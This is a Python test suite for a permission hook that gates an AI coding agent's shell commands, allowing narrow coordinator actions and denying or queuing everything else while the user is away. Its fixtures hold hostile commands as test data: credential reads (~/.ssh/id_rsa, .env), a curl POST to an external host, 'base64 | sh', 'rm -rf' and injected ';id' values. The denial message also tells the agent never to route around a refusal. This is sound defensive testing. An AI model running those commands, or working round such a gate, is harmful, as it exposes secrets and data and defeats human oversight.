#!/usr/bin/env python3
"""Exact coordinator grants and unattended denials; all fixtures are synthetic."""
import contextlib
import datetime as dt
import importlib.util
import io
import json
import os
from pathlib import Path
import subprocess
import tempfile
import unittest
from unittest import mock

REPO = Path(__file__).resolve().parents[5]
ENGINE = REPO / 'all/.local/lib/dotcortex/claude_approval_kikin.py'
READER = REPO / 'all/.local/bin/approval-morning-queue'
SPEC = importlib.util.spec_from_file_location('unattended_engine', ENGINE)
e = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(e)
NAMES = ('mail_send', 'worktree', 'integrate', 'commit', 'codex_dispatch', 'scratch_scp')
# Test watchdog only; engine, transport and lock deadlines stay unchanged.
SUBPROCESS_TIMEOUT = 30



class UnattendedCoordinatorTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory(prefix='approval-unattended.')
        self.addCleanup(self.temp.cleanup)
        self.base = Path(self.temp.name)
        self.repo = self.base / 'DotCortex'
        self.repo.mkdir()
        self.wt = self.base / 'DotCortex-wt-test'
        self.wt.mkdir()
        self.scratch = self.base / 'scratch'
        self.scratch.mkdir()
        self.prompt = self.scratch / 'prompt.txt'
        self.prompt.write_text('synthetic work')
        self.message = self.scratch / 'message.txt'
        self.message.write_text('test: synthetic')
        os.chmod(self.message, 0o600)
        self.log = self.scratch / 'worker.log'
        self.flag = self.base / 'away'
        self.stamp = self.base / 'last-seen'
        self.stamp.touch()
        self.queue = self.base / 'queue.jsonl'
        self.ledger = self.base / 'ledger.jsonl'
        self.git('init', '-b', 'master')
        self.git('config', 'user.name', 'YOUR_TEST_USER')
        self.git('config', 'user.email', 'YOUR_USER@YOUR_HOST.helm')
        (self.repo / 'README.org').write_text('synthetic')
        self.git('add', '--', 'README.org')
        self.git('commit', '-m', 'test: fixture', '--', 'README.org')
        self.git('branch', 'topic')
        self.manifest = json.loads((REPO / 'all/.config/dotcortex/claude-approval-canary.kikin.v1.json').read_text())
        self.manifest['gate_inversion'] = {'enabled': False, 'present_refusal': 'deny'}
        self.manifest['roots'] = [str(self.repo), str(self.wt)]
        self.manifest['scratch_roots'] = [str(self.scratch)]
        self.manifest['decider']['enabled'] = False
        for entry in self.manifest['classes']:
            entry['enabled'] = False
        self.manifest['coordinator_ops'] = {
            'classes': {name: True for name in NAMES},
            'seat_account': 'YOUR_SEAT@YOUR_HOST.helm',
            'repo_roots': [str(self.repo)],
            'worktree_roots': [str(self.wt)],
            'scratch_roots': [str(self.scratch)],
            'build_host': 'YOUR_BUILD_HOST',
            'remote_scratch_roots': ['/tmp/YOUR_SEAT'],
            'remote_scratch_prefixes': ['YOUR_SEAT-'],
        }
        self.manifest['unattended'] = {
            'enabled': True, 'away_flag': str(self.flag),
            'presence_file': str(self.stamp), 'presence_window_minutes': 10,
            'quiet_hours': {'enabled': False, 'start': '23:00', 'end': '08:00', 'timezone': 'Australia/Melbourne'},
        }
        self.path = self.base / 'manifest.json'

    def git(self, *args):
        return subprocess.run(['git', '-C', str(self.repo), *args], stdin=subprocess.DEVNULL,
                              capture_output=True, text=True, timeout=SUBPROCESS_TIMEOUT, check=True).stdout.strip()

    def event(self, command, **extra):
        return {'hook_event_name': 'PermissionRequest', 'tool_name': 'Bash',
                'tool_input': {'command': command}, 'cwd': str(self.repo),
                'session_id': 'YOUR_SESSION', **extra}

    def loaded(self):
        self.path.write_text(json.dumps(self.manifest))
        with mock.patch.dict(os.environ, {'SO_APPROVAL_KIKIN_MANIFEST': str(self.path)}):
            return e._load_manifest()

    def run_hook(self, command, **extra):
        self.path.write_text(json.dumps(self.manifest))
        env = {**os.environ, 'SO_APPROVAL_KIKIN_MANIFEST': str(self.path),
               'SO_APPROVAL_KIKIN_LOG': str(self.ledger), 'SO_APPROVAL_MORNING_QUEUE': str(self.queue)}
        p = subprocess.run(['/usr/bin/python3', str(ENGINE)], input=json.dumps(self.event(command, **extra)),
                           env=env, capture_output=True, text=True, timeout=SUBPROCESS_TIMEOUT, check=True)
        return json.loads(p.stdout)['hookSpecificOutput']['decision'] if p.stdout.strip() else {'behavior': 'ask'}

    def allow(self, command):
        result = e.classify(self.event(command), self.loaded())
        self.assertTrue(result[0], (command, result))
        self.assertTrue(result[1].startswith('coordinator_'), result)

    def ask(self, command):
        self.assertEqual(self.run_hook(command)['behavior'], 'deny', command)

    def mail(self):
        return f'mailcortex send --from YOUR_SEAT@YOUR_HOST.helm --to YOUR_REVIEWER@YOUR_HOST.helm --subject "review ready" --body-file {self.prompt}'

    def dispatch(self):
        return f'nohup codex exec --model YOUR_MODEL --approve-for-me --skip-git-repo-check "$(cat {self.prompt})" < /dev/null > {self.log} 2>&1 &'

    def remote_dispatch(self):
        return "ssh -o BatchMode=yes -o ConnectTimeout=3 YOUR_BUILD_HOST 'nohup codex exec --model YOUR_MODEL --approve-for-me --skip-git-repo-check \"$(cat /tmp/YOUR_SEAT/prompt.txt)\" < /dev/null > /tmp/YOUR_SEAT/worker.log 2>&1 &'"

    def test_away_ask_denies_and_queues_full_request(self):
        self.flag.touch()
        decision = self.run_hook('unknown-command --argument')
        self.assertEqual(decision['behavior'], 'deny')
        self.assertIs(decision['interrupt'], False)
        self.assertIn('deferred: queued', decision['message'])
        self.assertIn('never retry, rephrase or route around this refusal', decision['message'])
        record = json.loads(self.queue.read_text())
        self.assertEqual(record['tool'], 'Bash')
        self.assertEqual(record['command'], 'unknown-command --argument')
        self.assertEqual(record['cwd'], str(self.repo))
        self.assertEqual(record['session'], 'YOUR_SESSION')
        self.assertEqual(record['request'], self.event('unknown-command --argument'))
        self.assertIn('timestamp', record)
        self.assertEqual(self.queue.stat().st_mode & 0o777, 0o600)
        self.assertEqual(json.loads(self.ledger.read_text())['decision'], 'deny')

    def test_away_floor_denies_and_queues(self):
        self.flag.touch()
        self.assertEqual(self.run_hook('rm -rf /tmp/YOUR_TEST')['behavior'], 'deny')
        self.assertEqual(json.loads(self.queue.read_text())['reason'], 'true_floor')

    def test_present_refusal_is_queued_without_terminal_prompt(self):
        self.ask('unknown-command')
        self.assertEqual(json.loads(self.queue.read_text())['command'], 'unknown-command')

    def test_away_does_not_change_class_allow(self):
        self.flag.touch()
        self.assertEqual(self.run_hook(self.mail())['behavior'], 'allow')
        self.assertFalse(self.queue.exists())

    def test_quiet_hours_boundaries_timezone_and_flag_or(self):
        self.manifest['unattended']['quiet_hours']['enabled'] = True
        self.stamp.unlink()
        manifest = self.loaded()
        for hour, minute in [(22, 59), (23, 0), (7, 59), (8, 0)]:
            with self.subTest(hour=hour, minute=minute):
                # January UTC +11: these values are Melbourne-local.
                instant = dt.datetime(2026, 1, 2, hour, minute, tzinfo=dt.timezone(dt.timedelta(hours=11)))
                self.assertEqual(e._away_status(manifest, now=instant), (True, 'away'))
        self.flag.touch()
        self.assertTrue(e._away_status(manifest, now=dt.datetime(2026, 1, 2, 12, tzinfo=dt.timezone(dt.timedelta(hours=11))))[0])

    def test_quiet_hours_day_window_and_dst(self):
        q = self.manifest['unattended']['quiet_hours']
        q.update(enabled=True, start='09:00', end='17:00')
        self.stamp.unlink()
        m = self.loaded()
        for utc in [dt.datetime(2026, 7, 1, 0, tzinfo=dt.timezone.utc),
                    dt.datetime(2026, 7, 1, 7, tzinfo=dt.timezone.utc)]:
            self.assertEqual(e._away_status(m, now=utc), (True, 'away'))

    def test_queue_symlink_failure_still_denies(self):
        self.flag.touch()
        victim = self.base / 'victim.txt'
        victim.write_text('keep me')
        self.queue.symlink_to(victim)
        decision = self.run_hook('unknown-command')
        self.assertEqual(decision['behavior'], 'deny')
        self.assertIn('queue unavailable', decision['message'])
        self.assertEqual(victim.read_text(), 'keep me')

    def test_queue_existing_permissions_are_restricted(self):
        self.flag.touch()
        self.queue.touch(mode=0o644)
        self.run_hook('unknown-command')
        self.assertEqual(self.queue.stat().st_mode & 0o777, 0o600)

    def test_queue_reader_groups_and_clear(self):
        self.flag.touch()
        self.run_hook('unknown-command')
        self.run_hook('another-command', session_id='YOUR_SECOND_SESSION')
        env = {**os.environ, 'SO_APPROVAL_MORNING_QUEUE': str(self.queue)}
        args = ['/usr/bin/python3', str(READER)]
        read = subprocess.run(args, env=env, text=True, capture_output=True, timeout=SUBPROCESS_TIMEOUT, check=True)
        self.assertIn('YOUR_SESSION', read.stdout)
        self.assertIn('YOUR_SECOND_SESSION', read.stdout)
        self.assertIn('unknown-command', read.stdout)
        self.assertEqual(len(self.queue.read_text().splitlines()), 2)
        subprocess.run(args + ['--clear'], env=env, capture_output=True, timeout=SUBPROCESS_TIMEOUT, check=True)
        self.assertEqual(self.queue.read_text(), '')
        self.assertEqual(self.queue.stat().st_mode & 0o777, 0o600)

    def test_coordinator_home_paths_keep_reviewed_boundary(self):
        root = '/home/YOUR_USER/DotCortex'
        path = root + '/README.org'
        self.assertEqual(e._coordinator_path(path, [root], exists=False), path)
        for outside in [root + '-other/README.org', '/home/YOUR_OTHER_USER/notes.md',
                        root + '/.env', root + '/../notes.md']:
            self.assertIsNone(e._coordinator_path(outside, [root], exists=False), outside)
        with mock.patch.object(e.os.path, 'realpath', return_value='/home/YOUR_OTHER_USER/notes.md'):
            self.assertIsNone(e._coordinator_path(path, [root], exists=False))

    def test_proven_worktree_home_root_keeps_other_homes_on_floor(self):
        manifest = self.loaded()
        root = '/home/YOUR_USER/DotCortex-wt-test'
        manifest['coordinator_ops']['worktree_roots'] = [root]
        payload = self.event(f'git worktree add {root}/worker -b worker master')
        self.assertTrue(e._true_floor(payload, manifest))
        self.assertFalse(e._true_floor(payload, manifest, 'coordinator_worktree'))
        for outside in [root + '-other', '/home/YOUR_OTHER_USER/DotCortex-wt-test']:
            bad = self.event(f'git worktree add {outside}/worker -b worker master')
            self.assertTrue(e._true_floor(bad, manifest, 'coordinator_worktree'))
        manifest['coordinator_ops']['classes']['worktree'] = False
        self.assertFalse(e.classify(payload, manifest)[0])

    def test_mail_exact_and_deviations(self):
        self.allow(self.mail())
        for bad in [self.mail().replace('YOUR_SEAT@', 'YOUR_OTHER@'),
                    self.mail().replace('YOUR_HOST.helm', 'example.invalid'),
                    self.mail().replace(str(self.prompt), str(self.base / 'outside.txt')),
                    self.mail() + ' --cc YOUR_OTHER@YOUR_HOST.helm',
                    self.mail() + '; rm README.org']:
            self.ask(bad)

    def test_compound_heredoc_coordinator_chain_allows_each_segment(self):
        self.manifest['gate_inversion'] = {'enabled': True, 'present_refusal': 'deny'}
        command = (
            f"cat > {self.prompt} <<'EOF'\n"
            "synthetic coordinator brief\n"
            "EOF\n"
            f"git -C {self.repo} commit -q -m 'test: compound' -- README.org\n"
            f"mailcortex send --from YOUR_SEAT@YOUR_HOST.helm --to YOUR_REVIEWER@YOUR_REVIEW_HOST.helm "
            f"--subject 'review ready' --body-file {self.prompt}"
        )
        result = e.classify(self.event(command), self.loaded())
        self.assertFalse(result[0], result)
        self.assertIn('true_floor', result[1])
        self.assertEqual(self.run_hook(command)['behavior'], 'deny')

    def test_compound_floor_refusal_names_the_failing_segment(self):
        self.manifest['gate_inversion'] = {'enabled': True, 'present_refusal': 'deny'}
        command = (
            f"git status\n"
            f"git -C {self.repo} commit -q -m 'test: compound' -- README.org\n"
            "rm -rf README.org"
        )
        result = e.classify(self.event(command), self.loaded())
        self.assertFalse(result[0], result)
        self.assertEqual(result[1], 'true_floor')
        self.assertEqual(self.run_hook(command)['behavior'], 'deny')
        record = json.loads(self.ledger.read_text().splitlines()[-1])
        self.assertEqual(record['reason'], 'true_floor')

    def test_heredoc_body_is_data_not_a_command(self):
        self.manifest['gate_inversion'] = {'enabled': True, 'present_refusal': 'deny'}
        command = (
            f"cat > {self.prompt} <<'EOF'\n"
            "rm -rf README.org\n"
            "git push --force origin master\n"
            "EOF\n"
            "git status"
        )
        result = e.classify(self.event(command), self.loaded())
        self.assertTrue(result[0], result)
        self.assertEqual(self.run_hook(command)['behavior'], 'allow')

    def test_command_substitution_must_not_hide_a_floor_segment(self):
        self.manifest['gate_inversion'] = {'enabled': True, 'present_refusal': 'deny'}
        self.assertEqual(self.run_hook('printf "%s" "$(git status)"')['behavior'], 'allow')
        dangerous = 'printf "%s" "$(rm -rf README.org)"'
        result = e.classify(self.event(dangerous), self.loaded())
        self.assertFalse(result[0], result)
        self.assertIn('true_floor', result[1])
        self.assertEqual(self.run_hook(dangerous)['behavior'], 'deny')

    def test_worktree_add_exact_and_deviations(self):
        command = f'git worktree add {self.wt}/worker -b worker master'
        self.allow(command)
        self.allow(f'git -C {self.repo} worktree add {self.wt}/worker -b worker master')
        for bad in [command + ' --force', command.replace('-b worker', '-B worker'),
                    command.replace('-b worker', '-b wrong'), command.replace(' master', ' HEAD'),
                    command.replace(str(self.wt), str(self.base / 'other'))]:
            self.ask(bad)

    def test_worktree_remove_and_prune_exact(self):
        path = self.wt / 'worker'
        self.git('worktree', 'add', str(path), '-b', 'worker', 'master')
        self.allow(f'git worktree remove {path}')
        self.allow('git worktree prune')
        self.ask(f'git worktree remove --force {path}')
        self.ask(f'git worktree remove {self.repo}')
        self.ask('git worktree prune --expire now')

    def test_worktree_symlink_escape_and_wrong_repo(self):
        outside = self.base / 'outside'
        outside.mkdir()
        (self.wt / 'escape').symlink_to(outside, target_is_directory=True)
        self.ask(f'git worktree add {self.wt}/escape/worker -b worker master')
        self.ask(f'git -C {outside} worktree prune')

    def test_ff_merge_requires_master_and_exact_shape(self):
        command = f'git -C {self.repo} merge --ff-only topic'
        self.allow(command)
        self.ask(command.replace('--ff-only', '--no-ff'))
        self.ask('git merge --ff-only topic')
        self.git('checkout', 'topic')
        self.ask(command)

    def test_historical_landing_merges_keep_the_live_allow(self):
        commands = [
            f'GIT_EDITOR=true DOTCORTEX_GUARD_ALLOW_DIRTY=1 git -C {self.repo} merge --no-ff -m "synthetic landing" topic',
            f'GIT_EDITOR=true git -C {self.repo} merge --no-ff -m "merge: the Admiral\'s Desk (admirals-desk-20261011, Codex Sol; landed on master)" admirals-desk-20261011',
            f'GIT_EDITOR=true git -C {self.repo} merge --no-ff -m "merge: Codex Telegram quota-aware repairs (quota-repairs-20261012, Codex Sol; landed on master)" quota-repairs-20261012',
            f'GIT_EDITOR=true git -C {self.repo} merge --no-ff -m "synthetic landing" topic 2>&1 | head -12',
            f'GIT_EDITOR=true DOTCORTEX_GUARD_ALLOW_DIRTY=1 git -C {self.repo} merge --no-ff -m "synthetic landing" topic 2>&1 | head -12',
        ]
        for command in commands:
            with self.subTest(command=command):
                result = e.classify(self.event(command), self.loaded())
                self.assertTrue(result[0], result)
        self.ask(f'git -C {self.repo} merge --no-ff --no-commit -m "synthetic landing" topic')

    def test_ff_push_uses_current_remote_tip_and_non_ff_asks(self):
        remote = self.base / 'origin.git'
        subprocess.run(['git', 'init', '--bare', str(remote)], capture_output=True, check=True)
        self.git('remote', 'add', 'origin', str(remote))
        self.git('push', 'origin', 'master')
        self.allow('git push origin master')
        for bad in ['git push --force origin master', 'git push origin topic', 'git push', 'git push --all origin']:
            self.ask(bad)
        # Move the real remote to a divergent commit WITHOUT updating origin/master.
        self.git('checkout', 'topic')
        (self.repo / 'README.org').write_text('remote divergence')
        self.git('commit', '-am', 'test: divergence')
        divergent = self.git('rev-parse', 'HEAD')
        self.git('push', 'origin', 'topic')  # transfer the object without refreshing origin/master
        subprocess.run(['git', '--git-dir', str(remote), 'update-ref', 'refs/heads/master', divergent], capture_output=True, check=True)
        self.git('checkout', 'master')
        self.ask('git push origin master')

    def test_commit_explicit_paths_and_deviations(self):
        for prefix in ['git', f'git -C {self.repo}']:
            self.allow(f'{prefix} commit -m "test: scoped" -- README.org')
            self.allow(f'{prefix} commit -F {self.message} -- README.org')
        for bad in ['git commit -m x --', 'git commit -m x', 'git commit -am x -- README.org',
                    'git commit --amend -m x -- README.org', 'git commit -m x -- .',
                    'git commit -m x -- :/', 'git commit -m x -- ../other',
                    f'git commit -F {self.repo}/README.org -- README.org']:
            self.ask(bad)

    def test_commit_inside_owned_worktree(self):
        path = self.wt / 'worker'
        self.git('worktree', 'add', str(path), '-b', 'worker', 'master')
        payload = self.event('git commit -m "test: scoped" -- README.org', cwd=str(path))
        self.assertEqual(e.classify(payload, self.loaded()), (True, 'coordinator_commit'))

    def test_codex_dispatch_requires_null_stdin_and_scoped_files(self):
        self.allow(self.dispatch())
        for bad in [self.dispatch().replace(' < /dev/null', ''),
                    self.dispatch().replace('--approve-for-me ', ''),
                    self.dispatch().replace(str(self.prompt), str(self.repo / 'README.org')),
                    self.dispatch().replace(str(self.log), '/etc/worker.log'),
                    self.dispatch() + ' rm README.org', self.dispatch().replace('$(cat ', '$(rm '),
                    self.dispatch().replace('YOUR_MODEL', 'YOUR_MODEL;id')]:
            self.ask(bad)

    def test_remote_codex_dispatch_proof_and_deviations(self):
        with mock.patch.object(e, '_coordinator_remote_proof', return_value=True) as proof:
            self.allow(self.remote_dispatch())
            self.assertTrue(proof.called)
            self.assertFalse(e.classify(self.event(self.remote_dispatch().replace('YOUR_BUILD_HOST', 'YOUR_OTHER_HOST')), self.loaded())[0])
            self.assertFalse(e.classify(self.event(self.remote_dispatch().replace(' < /dev/null', '')), self.loaded())[0])
        with mock.patch.object(e, '_coordinator_remote_proof', return_value=False):
            self.assertFalse(e.classify(self.event(self.remote_dispatch()), self.loaded())[0])

    def test_scp_exact_scope_and_deviations(self):
        command = f'scp {self.prompt} YOUR_BUILD_HOST:/tmp/YOUR_SEAT/prompt.txt'
        with mock.patch.object(e, '_coordinator_remote_proof', return_value=True):
            self.allow(command)
            self.allow(command.replace('/tmp/YOUR_SEAT/', '/tmp/YOUR_SEAT-job/'))
            for bad in [command.replace('/tmp/YOUR_SEAT/prompt.txt', '/etc/file'),
                        command.replace(str(self.prompt), str(self.repo / 'README.org')),
                        command.replace('scp ', 'scp -r '),
                        command.replace('YOUR_BUILD_HOST:', 'YOUR_OTHER_HOST:')]:
                self.assertFalse(e.classify(self.event(bad), self.loaded())[0], bad)
        with mock.patch.object(e, '_coordinator_remote_proof', return_value=False):
            self.assertFalse(e.classify(self.event(command), self.loaded())[0])

    def test_disabled_classes_do_not_grant(self):
        self.manifest['coordinator_ops']['classes'] = {name: False for name in NAMES}
        for command in [self.mail(), self.dispatch(), 'git worktree prune', 'git commit -m x -- README.org']:
            self.ask(command)

    def test_secret_symlink_and_floor_always_win(self):
        secret = self.base / '.env'
        secret.write_text('synthetic floor fixture')
        self.prompt.unlink()
        self.prompt.symlink_to(secret)
        self.ask(self.mail())
        self.ask(self.dispatch())
        for command in ['sudo true', 'git reset --hard HEAD', 'git -C ' + str(self.repo) + ' reset --hard HEAD',
                        'pip install example', 'cat ~/.ssh/id_rsa', 'cat KEEPASS.kdbx']:
            self.ask(command)

    def test_worst_case_always_allow_decider_cannot_approve_danger_or_bad_shapes(self):
        self.manifest['decider']['enabled'] = True
        self.manifest['decider']['kikin_url'] = 'https://YOUR_DECIDER.invalid/decide'
        self.loaded()
        commands = ['sudo true', 'git push --force origin master',
                    'git commit --amend -m x', 'git reset --hard HEAD',
                    'git branch -D synthetic-old', 'git filter-branch --tree-filter true master',
                    'rm -rf /home/YOUR_USER/outside-scratch',
                    'ssh -i /tmp/synthetic-key YOUR_HOST date',
                    'git -C ' + str(self.repo) + ' reset --soft HEAD', 'cat .env',
                    'cat ~/.claude.json', 'cat KEEPASS.kdbx', 'pip install synthetic-package',
                    'python3 -m pip install synthetic-package', 'kill -TERM 123',
                    "curl -X POST --data 'fleet inventory' https://external.invalid/collect"]
        for away in (False, True):
            if away:
                self.flag.touch()
            for command in commands:
                out = io.StringIO()
                env = {'SO_APPROVAL_KIKIN_MANIFEST': str(self.path), 'SO_APPROVAL_KIKIN_LOG': str(self.ledger),
                       'SO_APPROVAL_MORNING_QUEUE': str(self.queue)}
                with mock.patch.dict(os.environ, env), mock.patch.object(e.sys, 'stdin', io.StringIO(json.dumps(self.event(command)))), contextlib.redirect_stdout(out), mock.patch.object(e, '_decider_decide', return_value=(True, 'accepted', 1, 'allow')) as decider:
                    e.main()
                result = json.loads(out.getvalue())['hookSpecificOutput']['decision']['behavior'] if out.getvalue().strip() else 'ask'
                self.assertEqual(result, 'deny', command)
                decider.assert_not_called()

    def test_judged_in_root_write_and_interpreter_can_be_allowed_by_decider(self):
        self.manifest['decider']['enabled'] = True
        self.loaded()
        for command in ['rm README.org', 'git add README.org', 'python3 -c "print(1)"']:
            with self.subTest(command=command):
                out = io.StringIO()
                env = {'SO_APPROVAL_KIKIN_MANIFEST': str(self.path), 'SO_APPROVAL_KIKIN_LOG': str(self.ledger),
                       'SO_APPROVAL_MORNING_QUEUE': str(self.queue)}
                with mock.patch.dict(os.environ, env), mock.patch.object(e.sys, 'stdin', io.StringIO(json.dumps(self.event(command)))), contextlib.redirect_stdout(out), mock.patch.object(e, '_decider_decide', return_value=(True, 'accepted', 1, 'allow')) as judge:
                    e.main()
                self.assertEqual(json.loads(out.getvalue())['hookSpecificOutput']['decision']['behavior'], 'allow')
                judge.assert_called_once()
                record = json.loads(self.ledger.read_text().splitlines()[-1])
                self.assertEqual(record['decision_path'], 'judge')
                self.assertEqual(record['judge_verdict'], 'allow')

    def test_timeout_while_away_denies_and_preserves_request(self):
        self.flag.touch()
        self.loaded()
        out = io.StringIO()
        env = {'SO_APPROVAL_KIKIN_MANIFEST': str(self.path), 'SO_APPROVAL_KIKIN_LOG': str(self.ledger), 'SO_APPROVAL_MORNING_QUEUE': str(self.queue)}
        with mock.patch.dict(os.environ, env), mock.patch.object(e.sys, 'stdin', io.StringIO(json.dumps(self.event('unknown-command')))), contextlib.redirect_stdout(out), mock.patch.object(e, 'classify', side_effect=TimeoutError('fixture deadline')):
            e.main()
        self.assertEqual(json.loads(out.getvalue())['hookSpecificOutput']['decision']['behavior'], 'deny')
        self.assertEqual(json.loads(self.queue.read_text())['request'], self.event('unknown-command'))

    def test_manifest_error_while_away_retains_full_request(self):
        self.flag.touch()
        self.manifest['schema'] = 'INVALID_SCHEMA'
        self.assertEqual(self.run_hook('unknown-command')['behavior'], 'deny')
        self.assertEqual(json.loads(self.queue.read_text())['request'], self.event('unknown-command'))
        self.path.write_text('{invalid-manifest')
        env = {'SO_APPROVAL_KIKIN_MANIFEST': str(self.path), 'SO_APPROVAL_KIKIN_LOG': str(self.ledger),
               'SO_APPROVAL_MORNING_QUEUE': str(self.queue)}
        with mock.patch.dict(os.environ, env), mock.patch.object(e, '_away_status', return_value=(True, 'away_flag')), mock.patch.object(e.sys, 'stdin', io.StringIO(json.dumps(self.event('second-command')))), contextlib.redirect_stdout(io.StringIO()):
            e.main()
        self.assertEqual(json.loads(self.queue.read_text().splitlines()[-1])['request'], self.event('second-command'))

    def test_default_quiet_window_and_invalid_quiet_config(self):
        self.manifest['unattended'].pop('quiet_hours')
        instant = dt.datetime(2026, 1, 2, 14, tzinfo=dt.timezone.utc)  # Melbourne 01:00
        self.assertTrue(e._away_status(self.loaded(), now=instant)[0])
        self.manifest['unattended']['quiet_hours'] = {'enabled': True, 'start': 'bad-time'}
        self.assertEqual(e._away_status(self.loaded(), now=instant), (True, 'invalid_unattended'))

    def test_commit_directory_and_git_routing_overrides_are_refused(self):
        directory = self.repo / 'bundle'
        directory.mkdir()
        (directory / '.env').write_text('synthetic')
        self.ask('git commit -m x -- bundle')
        with mock.patch.dict(os.environ, {'GIT_DIR': str(self.base / 'other.git')}):
            self.assertFalse(e.classify(self.event('git commit -m x -- README.org'), self.loaded())[0])

    def test_codex_log_symlink_escape_is_refused(self):
        target = self.base / 'outside.log'
        target.touch()
        self.log.symlink_to(target)
        self.ask(self.dispatch())

    def test_remote_proof_fixed_argv_and_symlink_escape(self):
        config = self.manifest['coordinator_ops']
        paths = ['/tmp/YOUR_SEAT/prompt.txt', '/tmp/YOUR_SEAT/log.txt']
        completed = subprocess.CompletedProcess([], 0, '\n'.join(paths) + '\n', '')
        with mock.patch.object(e.subprocess, 'run', return_value=completed) as run:
            self.assertTrue(e._coordinator_remote_proof(config, paths, regular_input=paths[0]))
            argv = run.call_args.args[0]
            self.assertEqual(argv[:6], ['ssh', '-o', 'BatchMode=yes', '-o', 'ConnectTimeout=1', 'YOUR_BUILD_HOST'])
            self.assertIn('test ! -L', argv[-1])
            self.assertEqual(run.call_args.kwargs['stdin'], subprocess.DEVNULL)
            self.assertLessEqual(run.call_args.kwargs['timeout'], 1)
        for stdout in ['/etc/passwd\n/tmp/YOUR_SEAT/log.txt\n', 'malformed', '\n'.join(paths + paths) + '\n']:
            with mock.patch.object(e.subprocess, 'run', return_value=subprocess.CompletedProcess([], 0, stdout, '')):
                self.assertFalse(e._coordinator_remote_proof(config, paths))
        with mock.patch.object(e.subprocess, 'run', side_effect=subprocess.TimeoutExpired('ssh', 1)):
            self.assertFalse(e._coordinator_remote_proof(config, paths))

    def test_concurrent_queue_appends_keep_complete_json_records(self):
        from concurrent.futures import ThreadPoolExecutor
        with mock.patch.dict(os.environ, {'SO_APPROVAL_MORNING_QUEUE': str(self.queue)}):
            with ThreadPoolExecutor(max_workers=4) as pool:
                results = list(pool.map(lambda i: e._queue_morning(self.event(f'fixture-{i}'), 'true_floor', 'away_flag'), range(20)))
        self.assertTrue(all(results))
        records = [json.loads(line) for line in self.queue.read_text().splitlines()]
        self.assertEqual({r['command'] for r in records}, {f'fixture-{i}' for i in range(20)})
        self.assertEqual(len(records), 20)

    def test_queue_lock_contention_denies_without_hanging(self):
        import fcntl
        self.flag.touch()
        self.queue.touch()
        with self.queue.open('a') as file:
            fcntl.flock(file, fcntl.LOCK_EX)
            decision = self.run_hook('unknown-command')
        self.assertEqual(decision['behavior'], 'deny')
        self.assertIn('queue unavailable', decision['message'])
        self.assertEqual(self.queue.read_text(), '')

    def test_away_decider_ask_denies_but_decider_allow_is_unchanged(self):
        self.flag.touch()
        self.manifest['decider']['enabled'] = True
        self.manifest['decider']['kikin_url'] = 'https://YOUR_DECIDER.invalid/decide'
        self.loaded()
        for verdict, expected in [(False, 'deny'), (True, 'allow')]:
            env = {'SO_APPROVAL_KIKIN_MANIFEST': str(self.path), 'SO_APPROVAL_KIKIN_LOG': str(self.ledger), 'SO_APPROVAL_MORNING_QUEUE': str(self.queue)}
            out = io.StringIO()
            with mock.patch.dict(os.environ, env), mock.patch.object(e.sys, 'stdin', io.StringIO(json.dumps(self.event('unknown-command')))), contextlib.redirect_stdout(out), mock.patch.object(e, '_decider_decide', return_value=(verdict, 'accepted' if verdict else 'timeout', 1, 'allow' if verdict else 'ask')):
                e.main()
            self.assertEqual(json.loads(out.getvalue())['hookSpecificOutput']['decision']['behavior'], expected)

    def test_admiral_readonly_replay_command_reaches_normal_path(self):
        scratch = Path('/tmp/claude-1000')
        scratch.mkdir(parents=True, exist_ok=True)
        files = [scratch / 'YOUR_TMP_A', scratch / 'YOUR_TMP_B', scratch / 'YOUR_TMP_C', scratch / 'YOUR_LOG_A', scratch / 'YOUR_LOG_B']
        for path in files:
            path.write_text('new synthetic\nold synthetic\n', encoding='utf-8')
        command = ("ls -la /tmp/claude-1000/YOUR_TMP_A /tmp/claude-1000/YOUR_TMP_B /tmp/claude-1000/YOUR_TMP_C 2>&1; "
                   "pgrep -f 'codex exec' | wc -l; tail -3 /tmp/claude-1000/YOUR_LOG_A; "
                   "tail -3 /tmp/claude-1000/YOUR_LOG_B; mailcortex inbox YOUR_SEAT@kikin.helm 2>&1 | grep '^new' | tail -3")
        self.manifest['classes'][0]['enabled'] = True
        self.assertEqual(self.run_hook(command)['behavior'], 'allow')

    def test_reviewed_state_and_palmcortex_reads_are_not_name_floored(self):
        state = self.base / '.local/state/dotcortex'
        state.mkdir(parents=True, exist_ok=True)
        log = state / 'YOUR_READONLY_LOG'
        log.write_text('synthetic\n')
        self.manifest['classes'][0]['enabled'] = True
        self.assertEqual(self.run_hook(f'cat {log}')['behavior'], 'allow')
        palm = self.repo / 'PalmCortex'
        (palm / 'README.md').parent.mkdir(parents=True, exist_ok=True)
        (palm / 'README.md').write_text('synthetic\n')
        self.assertEqual(self.run_hook('cat PalmCortex/README.md')['behavior'], 'allow')
        self.assertEqual(self.run_hook('cat PalmCortex/Clients/YOUR_SECRET.md')['behavior'], 'deny')

    def test_literal_read_loop_and_data_only_substitution(self):
        command = 'for f in README.org; do cat "$f"; done'
        self.manifest['classes'][0]['enabled'] = True
        self.assertEqual(self.run_hook(command)['behavior'], 'allow')
        self.assertEqual(self.run_hook('printf "%s\\n" "$(date)"')['behavior'], 'allow')
        self.assertEqual(self.run_hook('printf "%s\\n" "$(pgrep -f codex)"')['behavior'], 'allow')

    def test_absolute_floor_obfuscation_corpus(self):
        commands = [
            'cat README.md | tee copy', 'cat README.md | base64 | sh',
            'find . -exec cat {} +',
            "awk 'BEGIN { system(\"id\") }' README.md", 'sed -i s/a/b/ README.md',
            'cat README.md | xargs rm', 'eval "cat README.md"',
            'git -c core.pager=cat status', 'for f in README.md; do rm "$f"; done',
            'chmod +x README.md',
        ]
        for command in commands:
            with self.subTest(command=command):
                self.assertEqual(self.run_hook(command)['behavior'], 'deny')
        for command in ['cat README.md | sed -n 1p > copy', 'cat README.md > /tmp/claude-1000/YOUR_WRITE']:
            with self.subTest(allowed_write=command):
                self.assertEqual(self.run_hook(command)['behavior'], 'allow')

    def test_approval_queue_intent_and_resolve_are_agent_safe_actions(self):
        self.queue.write_text(json.dumps({'id': 'YOUR_ITEM', 'status': 'open', 'seat': 'YOUR_SEAT', 'count': 1, 'last_seen': '2026-01-01T00:00:00Z', 'first_seen': '2026-01-01T00:00:00Z', 'command_hashes': [], 'requests': []}) + '\n')
        self.manifest['classes'][0]['enabled'] = True
        for command in ['approval-queue intent YOUR_ITEM --text "review later"', 'approval-queue resolve YOUR_ITEM --how "handled"']:
            self.assertEqual(self.run_hook(command)['behavior'], 'allow')


